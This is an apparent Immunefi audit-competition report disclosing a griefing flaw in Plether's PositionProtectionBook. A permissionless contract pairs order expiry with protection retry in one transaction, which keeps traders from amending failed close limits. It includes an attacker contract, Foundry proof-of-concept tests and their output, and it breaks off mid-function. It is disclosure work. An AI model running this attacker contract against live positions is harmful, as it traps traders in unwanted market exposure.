# \#99309 [SC-High] Permissionless atomic expiry-and-retry starves the owner-only close-limit amendment, denying a trader the protocol's recovery path for a failed protection close

**Submitted on Nov 13th 2026 at 03:51:29 UTC by @OadeHack for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99309
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

`PositionProtectionBook` gives a trader exactly one way to recover a triggered protection whose close keeps failing on its own retained financial limits: [`amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328). That function is owner-gated and requires the protection to be in `Latched` state with no pending orders.

[`retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406) requires the **same** `Latched` + zero-pending state, but it is **permissionless**: it resolves the protection through [`_activeProtection`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L993) rather than the owner-scoped [`_ownedActiveProtection`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L983), imposes no owner grace period, and costs the caller no USDG.

Because [`OrderRouter.expireOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L196) is also permissionless, a third party can call **`expireOrder(child)` and `retryPositionProtectionClose(protectionId)` from a single contract in one transaction**. The protection moves `Triggered → Latched → Triggered` entirely *inside* that transaction, so the `Latched` state never exists at a transaction boundary where an ordinary EOA owner could submit their amendment. The attacker gains nothing, pays only gas, and can repeat the sequence at each replacement child's deadline.

## Details

### 1. A failed protected close relatches with its original, still-unexecutable limits

When a trader's protected close fails on a retained financial-limit constraint, the attempt is terminalized and the still-matching protection returns from `Triggered` to `Latched` with its limit values unchanged, in [`handleFailedProtectionAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667). The position stays open and the trader stays exposed.

### 2. The owner's only remedy is gated on `Latched` with no pending orders

[`amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328) authenticates the owner, then requires:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

This is the only way a trader can correct close limits that have become unexecutable. Notably, this function is **not described anywhere in `SECURITY.md`** — the disclosed protection policy does not cover its availability guarantees.

### 3. Retry demands the identical state but is permissionless and free

[`retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406) uses `_activeProtection(protectionId)` — **no `msg.sender` restriction** — and gates on the same two conditions the owner's amendment needs:

```solidity
StoredProtection storage protection = _activeProtection(protectionId);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
_requireMatchingPosition(protection);
if (router.pendingOrderCounts(protection.account) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

On success, [`_recordCloseAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L575) sets the status back to `Triggered` and links a fresh zero-bounty close child carrying the same unexecutable limits. The owner and any third party therefore compete for one shared, single-use state.

### 4. The attacker closes the window atomically, so no boundary `Latched` state exists

Both `expireOrder` and `retryPositionProtectionClose` are permissionless, so one attacker-controlled contract performs both in a single external transaction:

```solidity
expired = IP01PublicExpiry(routerAddress).expireOrder(oldAttemptId);
require(expired.status == OrderV3Types.LifecycleStatus.Failed, "P01: original not terminal");
nextAttemptId = IP01PublicRetry(protectionBookAddress).retryPositionProtectionClose(protectionId);
```

`Latched` is created and consumed within one call frame. An EOA owner — who must use two separate transactions to expire and then amend — has no boundary at which to insert the amendment.

### 5. Every owner recovery route reverts while `Triggered`

With the replacement child live, the PoC verifies all four owner exits fail:

- `amendLatchedPositionProtectionCloseLimits` → `OrderRouter__ProtectionNotLatched`
- `cancelPositionProtection` ([L331](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L331)) → `OrderRouter__ProtectionNotArmed`
- `cancelPositionProtectionAndCommitClose` ([L341](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341)) → `OrderRouter__ProtectionNotArmed`
- direct `router.commitOrder` of a manual full close → `OrderRouter__ProtectionActive`

### 6. The denial is renewable, not a one-shot race

At each replacement child's genuine `executionDeadline + 1`, the attacker repeats the atomic pair. The PoC runs **60 consecutive cycles across 3,660 simulated seconds**, asserting at the end of every attacker transaction that the owner's amendment still reverts, and asserting the real per-child deadline at each step.

## Impact — Medium: Griefing

**Category:** Griefing — a permissionless third party repeatedly denies another user the protocol's only recovery mechanism for a failed protection close, obtaining no profit and paying gas to do it.

**Why this satisfies the griefing standard** (all figures are observed values from the passing run):

| Griefing criterion | Evidence from the PoC |
|---|---|
| Attacker obtains no profit | `clearinghouse.balanceAssets(BOB)` is **unchanged** across all 60 cycles; every retry is asserted `executionBountyAssets == 0`, zero-bounty by design (`SECURITY.md`: "terminal-invalid closes move no bounty value") |
| Attacker bears a real cost | **937,482** gas per atomic expiry+retry; **56,131,090** gas across the 60-cycle run |
| Victim is forced to spend to recover | Under attack the owner must add a transaction the control branch never needs — terminalizing the attacker's child with fresh signed Pyth data, measured at **524,934** gas (plus the Pyth update fee) — *per cycle*, before the amendment window reopens. This obliges an ordinary trader to run keeper-grade oracle infrastructure on a path the protocol never documents |
| Victim is denied the protocol's remedy | While `Triggered`, **all four** owner exits revert with named selectors: `OrderRouter__ProtectionNotLatched`, `OrderRouter__ProtectionNotArmed` (cancel), `OrderRouter__ProtectionNotArmed` (cancel-and-close), `OrderRouter__ProtectionActive` (manual close) |
| Victim is held in unwanted exposure | `size == POSITION_SIZE` is asserted after every attacker transaction — the position stays open and market-exposed for the full window |
| Harm is to a third party | The attacker operates on an account it does not own; the protection owner is a different address |
| Sustained, not incidental | **60** renewals over **3,660** seconds, each enforcing the child's real `executionDeadline`, with the owner's amendment asserted to revert after *every* attacker transaction |

Gas values are `forge test` call-level measurements, not Arbitrum L2 charged receipts.

**What is demonstrated:** the atomic `Triggered → Latched → Triggered` transition with no boundary `Latched` state; the unavailability of all four owner recovery entrypoints during `Triggered`; renewal across more than an hour of real per-child deadlines; retention of the original position and trade lock; a quantified extra recovery transaction forced onto the victim; and zero attacker USDG gain. From the *same `vm.snapshotState()` without attacker interference*, the owner successfully amends and closes (`size == 0`, lock released) — isolating the attacker's action as the sole cause of the denial. When the attacker stops, the owner recovers fully, confirming this is attacker-induced rather than a protocol lock.

**On the victim's unchanged USDG balance.** The PoC asserts `balanceAssets(ALICE)` is identical in both branches (**20,992,199,994** in the control and **20,992,199,994** after the attack). That assertion exists to prove the attack **moves no USDG and steals nothing** — which is precisely why this is filed as griefing rather than theft. It is **not** evidence of absent harm: the harm is the denial of the trader's only remedy, the forced additional recovery transactions, and the unwanted market exposure held open against the owner's will. A griefing finding does not require the victim's token balance to change.

**What is not claimed:** no theft of funds, no protocol insolvency, no permanent freezing of funds, and no guaranteed unavoidable on-chain denial for any fixed duration.

### Mitigating factors (these do not invalidate the issue)

- An owner or any keeper holding valid signed Pyth data can terminalize the failing child **before** its deadline, which restores a `Latched` window. This is not, however, a user-facing remedy, and its existence should not be read as excusing the denial. To use it an ordinary trader must operate **keeper-grade infrastructure**: source a signed Pyth price payload off-chain, pay the oracle update fee, and deliberately submit an order they already know will fail — all purely to regain access to a function the protocol already grants them. The protocol advises none of this. `SECURITY.md` does not mention `amendLatchedPositionProtectionCloseLimits` anywhere, and no documentation tells a trader that recovering their own failed protection may require self-funded oracle updates. The measured cost of that forced workaround is **524,934** gas plus the Pyth fee **per cycle**, and after paying it the owner must still land a **separate second transaction** to amend, which the attacker can contest again with its atomic pair. A remedy that requires the victim to behave like a keeper, on a path the protocol never documents, is not a substitute for the remedy being available.
- A smart-account or transaction-bundling owner can combine terminalization and amendment atomically and escape entirely. The denial specifically affects ordinary **EOA** owners, who cannot bundle.
- The attacker does not control Arbitrum sequencer ordering, so each individual cycle is a race rather than a guarantee. The asymmetry favors the attacker: the owner needs an uninterrupted multi-transaction sequence, while the attacker needs to win only one interruption to reset it.
- Gas figures are `forge test` call-level measurements, not L2 charged receipts.

### Distinction from disclosed behavior

`SECURITY.md` deliberately permits permissionless retries, retains financial limits on failed children, and documents relatching ("A current registered protection attempt may relatch for a fresh child when the exact protected position remains"). It also discloses a liveness concern — but the **opposite** one:

> "failed protection-attempt cleanup is deliberately unpaid; each retry creates a fresh zero-bounty close record… Liveness depends on keepers processing the terminal attempt and separately appending a retry, and operators **must alert on prolonged `Latched` state without a live child**"

The disclosed risk is **under-retry**: nobody appends a retry, so the protection sits idle in `Latched`. This report is the **inverse** case — adversarial **over-retry** that prevents the protection from ever resting in `Latched` at a transaction boundary, thereby starving the owner-only amendment. The published policy anticipates that retries are unpaid and permissionless; it does not address a third party consuming the shared `Latched` state atomically to deny the owner's remedy, and it never mentions `amendLatchedPositionProtectionCloseLimits` or any availability guarantee for it.

This is also distinct from the previously disclosed concern about keepers retrying *without* the trader's financial limits: here the limits are correctly retained, and the defect is that the remedy introduced to let the trader fix those limits can be withheld indefinitely by a third party at zero economic cost.

## Recommendation

Preserve permissionless keeper retries while guaranteeing the owner a reachable path to correct limits or exit after a failed attempt. Any one of:

1. **Owner-priority grace after relatch** — a brief interval during which anyone may expire the child but only the owner may amend or retry.
2. **Owner amendment while `Triggered`** — allow the owner to atomically replace the financial limits and the pending protected-close child under identity, position, and limit checks.
3. **Owner-only atomic transition** — an `amend-and-retry` or `cancel-and-close` entrypoint that does not depend on an externally observable `Latched` gap.

Any fix should keep the explicit protection mandate intact, prevent third parties from weakening a trader's limits, and handle active-child and bounty accounting safely.


## Proof of Concept


Two Foundry files extending the repository's existing `PositionProtectionTest` fixture against unmodified in-scope contracts. No production source is modified; the only added contract is an attacker actor deployed inside the fixture.

Place in `packages/perps/test/perps/spec/trader/`:

- `PletherProtectionRetryGriefV15.t.sol`
- `PletherProtectionAtomicRearmFinal.t.sol`

Run from the repository root:

```bash
forge test --root packages/perps --offline \
  --match-contract '^PletherProtectionAtomicRearmFinal$' \
  --match-test '^test_P01F_' -vvv
```

Observed result:

```text
Ran 4 tests for test/perps/spec/trader/PletherProtectionAtomicRearmFinal.t.sol:PletherProtectionAtomicRearmFinal
[PASS] test_P01F_01_AtomicExpiryRetryVsOwnerFirstControl() (gas: 5887994)
Logs:
  P01F owner-first control fully closed: 1
  P01F attacker atomic expiry+retry gas proxy: 937482
  P01F attacker new child: 3
  P01F owner amendment/cancel/normal close blocked: 1

[PASS] test_P01F_02_ContinuousAtomicRearmAcrossOneHour() (gas: 53085546)
Logs:
  P01F uninterrupted conditional lock elapsed seconds: 3660
  P01F committed attacker cycles: 60
  P01F total attacker call gas proxy: 56131090
  P01F last active child: 62
  P01F owner fully exits once attacker stops: 1

[PASS] test_P01F_03_FreshPythAllowsEarlyTerminalThenOwnerRecovery() (gas: 7530535)
Logs:
  P01F owner-first final settlement: 20992199994
  P01F attacker atomic call gas proxy: 937482
  P01F owner extra bad-child terminal gas proxy: 524934
  P01F attacked final Alice settlement: 20992199994
  P01F owner eventually recovered with fresh Pyth: 1

[PASS] test_P01F_04_AtomicPairCannotRunBeforeDeadline() (gas: 3857552)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 256.37ms (285.71ms CPU time)
```

Reading the key values: `owner amendment/cancel/normal close blocked: 1` is the four-way denial in `_01`; `committed attacker cycles: 60` over `elapsed seconds: 3660` is the sustained renewal in `_02`; `owner extra bad-child terminal gas proxy: 524934` in `_03` is the recovery transaction the attacker forces onto the victim that the control branch does not need; and the two identical settlements (`20992199994`) confirm no USDG is moved, classifying this as griefing rather than theft.

What each test establishes:

- **`_01`** — from one identical post-deadline snapshot: the control branch lets the owner expire, amend, and close successfully; the attack branch atomically expires and retries, after which all four owner recovery entrypoints revert. This is the differential that isolates the attacker's action as the cause.
- **`_02`** — 60 consecutive atomic rearm cycles across 3,660 seconds, asserting the real `executionDeadline` each round, that the owner's amendment reverts after every attacker transaction, that `BOB`'s USDG is unchanged, and that the position never silently closes. Ends by showing the owner fully recovers once the attacker stops — confirming the denial is caused by the attacker and is not a permanent lock.
- **`_03`** — the honest falsifier: with fresh signed Pyth data the owner can terminalize the bad child early and then recover, which is why this is filed as griefing rather than a freeze. Note what that recovery actually demands of the victim: sourcing a signed Pyth payload off-chain, paying the oracle update fee, and deliberately executing an order they know will fail — keeper infrastructure, on a path the protocol nowhere documents or advises — measured at **524,934** gas, after which they must still win the race for the window it reopens. A user should not have to go outside the protocol's own documented interface to recover an action the protocol already offers them.
- **`_04`** — negative control: the atomic pair cannot run before the genuine deadline (`OrderRouter__OrderNotExpired`), proving no deadline bypass is claimed.

The attacker actor, which is the core of the finding — both public calls must succeed or the whole transaction rolls back, which is what removes the boundary `Latched` state:

```solidity
contract P01AtomicRearmActor {
    function expireThenRetry(
        address routerAddress,
        address protectionBookAddress,
        uint64 oldAttemptId,
        uint64 protectionId
    ) external returns (uint64 nextAttemptId, OrderV3Types.ExecutionResult memory expired) {
        expired = IP01PublicExpiry(routerAddress).expireOrder(oldAttemptId);
        require(expired.status == OrderV3Types.LifecycleStatus.Failed, "P01: original not terminal");
        nextAttemptId = IP01PublicRetry(protectionBookAddress).retryPositionProtectionClose(protectionId);
    }
}
```

<!-- PASTE YOUR TWO COMPLETE TEST FILES HERE, verbatim, under the headings below. -->

### File 1 — `PletherProtectionRetryGriefV15.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Extend the *existing production-stack* PositionProtectionTest fixture.
// Tests run only under --match-test '^test_P01_' to avoid replaying its other tests.
import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

contract PletherProtectionRetryGriefV15 is PositionProtectionTest {
    uint256 internal constant P01_BAD_NOTIONAL_CAP = 1e6;
    uint256 internal constant P01_TARGET_LOCK_SECONDS = 3600;

    // One authentic, fully committed failed-close setup.  No mocked access to
    // PositionProtectionBook or Router private state, and no trusted actor spoofing.
    function _p01CreateLatched() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory p = _params(LONG_TAKE_PROFIT, 0);
        p.closeLimits.maxExecutionNotionalAssets = P01_BAD_NOTIONAL_CAP;

        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(p);
        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        vm.roll(block.number + 1);
        bytes[] memory updateData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(firstOrderId, updateData);

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "P01 initial execution is terminal failure");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "P01 financial limit caused failure");
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "P01 original financial failure leaves Alice exposed");
    }

    function _p01SafeLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    function _p01AssertState(
        uint64 protectionId,
        PositionProtectionTypes.PositionProtectionStatus expected,
        uint256 pendingOrders
    ) internal view {
        assertEq(uint8(protectionViews.getPositionProtection(protectionId).status), uint8(expected), "P01 protection status");
        assertEq(router.pendingOrderCounts(ALICE), pendingOrders, "P01 Alice pending orders");
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "P01 trade lock retained");
    }

    function _p01OwnerAmends(uint64 protectionId) internal {
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _p01SafeLimits());
        _assertStoredCloseLimits(protectionId, _p01SafeLimits());
    }

    function _p01OwnerExecutesAfterAmend(uint64 protectionId) internal {
        vm.roll(block.number + 1);
        vm.prank(BOB); // Retry is permissionless even after a *valid* owner amendment.
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retryId, _p01SafeLimits());
        vm.roll(block.number + 1);
        bytes[] memory updated = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, updated);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "P01 amended close must execute");
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "P01 Alice's position actually closes");
        assertEq(router.pendingOrderCounts(ALICE), 0, "P01 no stranded order");
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "P01 lock releases on close");
    }

    // CONTROL: Alice's valid owner-only action wins transaction ordering.
    // If this fails, the fixture is invalid, not proof of Bob's grief.
    function test_P01_01_ControlOwnerFirstAmendAndClose() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        emit log_named_uint("P01 CONTROL owner closed position", 1);
    }

    function _p01OneBobFirstCycle(uint64 protectionId, uint256 i) internal {
        vm.roll(block.number + 1);
        uint256 gasBefore = gasleft();
        vm.prank(BOB);
        uint64 newAttemptId = protectionActions.retryPositionProtectionClose(protectionId);
        emit log_named_uint("P01 retry gas proxy", gasBefore - gasleft());

        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
        assertEq(_orderRecord(newAttemptId).executionBountyAssets, 0, "P01 Bob queues zero-bounty close");
        _assertPendingCloseLimits(newAttemptId, PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: P01_BAD_NOTIONAL_CAP,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        }));

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _p01SafeLimits());

        if (i == 0) {
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(protectionId);

            // Prepare the request before expectRevert. `_manualCloseRequest`
            // reads router.nextCommitId(); v14 accidentally asserted a revert
            // on that read-only prerequisite rather than the exit transaction.
            OrderV3Types.OrderRequest memory atomicClose = _manualCloseRequest(CfdTypes.Side.LONG);
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtectionAndCommitClose(protectionId, atomicClose);

            // Independently challenge the canonical V3 manual-close path,
            // with all request-building view calls completed beforehand.
            OrderV3Types.OrderRequest memory manual = _manualCloseRequest(CfdTypes.Side.LONG);
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(manual);
        }

        uint64 deadline = router.lifecycleBook().orderTiming(newAttemptId).executionDeadline;
        assertGt(uint256(deadline), block.timestamp, "P01 retry has a live window");
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotExpired.selector);
        router.expireOrder(newAttemptId);

        // Owner can wait and expire. Bob immediately takes the next latch slot.
        vm.warp(uint256(deadline) + 1);
        vm.roll(block.number + 1);
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory expired = router.expireOrder(newAttemptId);
        assertEq(uint8(expired.status), uint8(OrderV3Types.LifecycleStatus.Failed), "P01 expired retry terminalized");
        assertEq(uint8(expired.terminalReason), uint8(OrderV3Types.TerminalReason.Expired), "P01 expiry reason");
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched, 0);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "P01 Alice remains exposed after expired retry");

    }

    // ATTACK HISTORY: Bob takes each public latch slot before Alice can amend.
    // Expiration and retry are separate transactions; the test assumes Bob-first
    // ordering, and *does not claim* the adversary can guarantee such ordering.
    function test_P01_02_BobFirstRepeatQueuesOwnerBlockedAndExpiry() public {
        _startRecordingLogs();
        uint64 protectionId = _p01CreateLatched();
        uint256 attackerSettlementBefore = clearinghouse.balanceAssets(BOB);
        uint256 aliceSettlementBefore = clearinghouse.balanceAssets(ALICE);
        uint256 beginning = block.timestamp;
        uint256 window = router.maxExecutionWindowSeconds();
        assertGt(window, 0, "P01 Router must have positive execution window");
        // Three cycles establish indefinite repeatability at the lifecycle level.
        // A separate elapsed-time check establishes one-hour *conditional* lock.
        uint256 count = P01_TARGET_LOCK_SECONDS / (window + 1) + 2;
        assertLe(count, 80, "P01 execution window requires more than 80 cycles; review fixture");
        emit log_named_uint("P01 retry window seconds", window);
        emit log_named_uint("P01 attacker retry cycles", count);

        for (uint256 i = 0; i < count; ++i) {
            _p01OneBobFirstCycle(protectionId, i);
        }
        uint256 elapsed = block.timestamp - beginning;
        emit log_named_uint("P01 conditional lock elapsed seconds", elapsed);
        assertGe(elapsed, P01_TARGET_LOCK_SECONDS, "P01 Bob-first sequence lasts >= one hour");
        assertEq(clearinghouse.balanceAssets(BOB), attackerSettlementBefore, "P01 retry consumes no Bob USDG");
        emit log_named_uint("P01 Alice settlement before", aliceSettlementBefore);
        emit log_named_uint("P01 Alice settlement after", clearinghouse.balanceAssets(ALICE));

        // FALSIFIER: as soon as Bob does not win the next transaction, the owner
        // can amend and close. Thus these results alone never prove an inevitable freeze.
        _p01OwnerAmends(protectionId);
        _p01OwnerExecutesAfterAmend(protectionId);
        emit log_named_uint("P01 unlocked after owner-first amendment", 1);
    }

    struct P01Gas {
        uint256 ownerAmend;
        uint256 ownerSuccessfulExecution;
        uint256 ownerFailedAmend;
        uint256 ownerManualCommitAttempt;
        uint256 ownerBadRetryExecution;
        uint256 bobInitialRetry;
        uint256 ownerManualExecution;
        bool directManualCloseCommitted;
    }

    function _p01CostedAmend(uint64 protectionId) internal returns (uint256 gasUsed) {
        PositionProtectionTypes.CloseFinancialLimits memory safe = _p01SafeLimits();
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, safe);
        gasUsed = beforeGas - gasleft();
        _assertStoredCloseLimits(protectionId, safe);
    }

    function _p01CostedSuccessfulExecution(uint64 protectionId)
        internal returns (uint256 gasUsed)
    {
        vm.roll(block.number + 1);
        vm.prank(BOB);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retryId, _p01SafeLimits());
        vm.roll(block.number + 1);
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, data);
        gasUsed = beforeGas - gasleft();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "P01 final public close executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "P01 final position actually closed");
        assertEq(router.pendingOrderCounts(ALICE), 0, "P01 final no pending orders");
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "P01 final protection released");
    }

    function _p01RevertSelector(bytes memory reason) internal pure returns (bytes4 selector) {
        if (reason.length < 4) return bytes4(0);
        assembly ("memory-safe") { selector := mload(add(reason, 32)) }
    }

    function _p01CostedFailedAmend(uint64 protectionId) internal returns (uint256 gasUsed) {
        PositionProtectionTypes.CloseFinancialLimits memory safe = _p01SafeLimits();
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        try protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, safe) {
            revert("P01 Bob-first owner amendment unexpectedly worked");
        } catch (bytes memory reason) {
            assertEq(
                _p01RevertSelector(reason),
                IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector,
                "P01 exact failing owner amendment reason"
            );
        }
        gasUsed = beforeGas - gasleft();
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
    }

    // Try the actual production V3 ABI, not the test-only five-argument
    // LegacyOrderRouterHarness overload. A successful commit is followed by a
    // COMPLETE EXECUTION attempt; an accepted commit alone is not a live exit.
    function _p01CostedActualManualCommit()
        internal returns (bool accepted, uint64 manualId, uint256 gasUsed)
    {
        OrderV3Types.OrderRequest memory manual = _manualCloseRequest(CfdTypes.Side.LONG);
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        try router.commitOrder(manual) returns (uint64 orderId) {
            accepted = true;
            manualId = orderId;
        } catch (bytes memory reason) {
            bytes4 selector = _p01RevertSelector(reason);
            assertEq(selector, IOrderRouterErrors.OrderRouter__ProtectionActive.selector, "P01 V3 manual-close blocking selector");
        }
        gasUsed = beforeGas - gasleft();
    }

    function _p01CostedEarlyTerminal(uint64 retryId)
        internal returns (uint256 gasUsed)
    {
        vm.roll(block.number + 1);
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        uint256 beforeTime = block.timestamp;
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, data);
        gasUsed = beforeGas - gasleft();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "P01 early terminalization must fail old limit");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "P01 early limit violation");
        assertEq(block.timestamp, beforeTime, "P01 no simulated hour required to recover");
    }

    function _p01CostedExecuteManualAlreadyAtHead(uint64 manualId)
        internal returns (uint256 gasUsed)
    {
        // FIFO prior child was terminalized separately. Measure only the
        // successful independent manual order's execution call here.
        vm.roll(block.number + 1);
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        uint256 beforeGas = gasleft();
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(manualId, data);
        gasUsed = beforeGas - gasleft();
        emit log_named_uint("P01 alternative manual result status", uint8(result.status));
        (uint256 remaining,,,,,,) = engine.positions(ALICE);
        emit log_named_uint("P01 alternative manual remaining size", remaining);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "P01 admitted manual close must execute");
        assertEq(remaining, 0, "P01 independent manual close actually exits");
    }

    struct P01BenchResult {
        uint256 ownerRecoveryGas;
        uint256 ownerFrontRunRevertGas;
        uint256 optionalManualProbeGas;
        uint256 bobGas;
        uint256 aliceSettlementEnd;
        bool manualCommitAllowed;
    }

    function _p01BenchmarkOwnerFirst(uint64 protectionId)
        internal returns (P01BenchResult memory r)
    {
        P01Gas memory g;
        g.ownerAmend = _p01CostedAmend(protectionId);
        g.ownerSuccessfulExecution = _p01CostedSuccessfulExecution(protectionId);
        r.ownerRecoveryGas = g.ownerAmend + g.ownerSuccessfulExecution;
        r.aliceSettlementEnd = clearinghouse.balanceAssets(ALICE);
    }

    function _p01BenchmarkBobFirst(uint64 protectionId)
        internal returns (P01BenchResult memory r)
    {
        P01Gas memory g;
        uint256 beforeBob = gasleft();
        vm.prank(BOB);
        uint64 badRetry = protectionActions.retryPositionProtectionClose(protectionId);
        g.bobInitialRetry = beforeBob - gasleft();
        assertEq(_orderRecord(badRetry).executionBountyAssets, 0, "P01 Bob receives no cash bounty");
        _p01AssertState(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered, 1);
        g.ownerFailedAmend = _p01CostedFailedAmend(protectionId);
        uint64 manualId;
        (g.directManualCloseCommitted, manualId, g.ownerManualCommitAttempt) = _p01CostedActualManualCommit();
        emit log_named_uint("P01 actual V3 manual commit admitted", g.directManualCloseCommitted ? 1 : 0);

        if (g.directManualCloseCommitted) {
            g.ownerBadRetryExecution = _p01CostedEarlyTerminal(badRetry);
